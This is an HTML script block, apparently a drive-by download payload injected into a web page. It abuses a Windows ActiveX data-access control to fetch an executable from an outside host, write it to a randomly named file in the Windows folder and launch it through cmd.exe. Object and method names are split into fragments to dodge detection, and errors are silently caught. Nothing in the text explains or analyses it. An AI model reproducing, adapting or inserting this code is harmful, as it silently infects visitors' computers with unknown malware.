<script language="javaScript">
function gn(n) 
{ 
var number = Math.random()*n; return '~tmp'+Math.round(number)+'.exe'; 
} 
lj="http://www.pps900.cn/e.exe";
try 
{ aaa="o";
yyy="ct";
ccc="Adod";
ddd="b.Stream";
eee="Microsoft.XMLHTT"+"P";
ggg="o";
kkk="p";
mmm="e";
sss="n";
var df=document.createElement(aaa+"bje"+yyy); 
df.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36"); 
var x=df.CreateObject(eee,""); 
var S=df.CreateObject(ccc+ddd,""); 
S.type=1; 
x.open("GET", lj,0);
x.send(); 
mz1=gn(10000); 
var F=df.CreateObject("Scripting.FileSystemObject",""); 
var tmp=F.GetSpecialFolder(0); mz1= F.BuildPath(tmp,mz1); 
S.Open();
ttt=x.responseBody;
S.Write(ttt); 
i=2;
S.SaveToFile(mz1,i); S.Close(); 
var Q=df.CreateObject("Shell.Application",""); 
exp1=F.BuildPath(tmp+'\\sys'+'tem32','cmd.exe'); 
Q["ShellE"+"xecute"](exp1,' /c '+mz1,"",ggg+kkk+mmm+sss,0); 
} catch(i) { i=1; } 
</script>&nbsp;
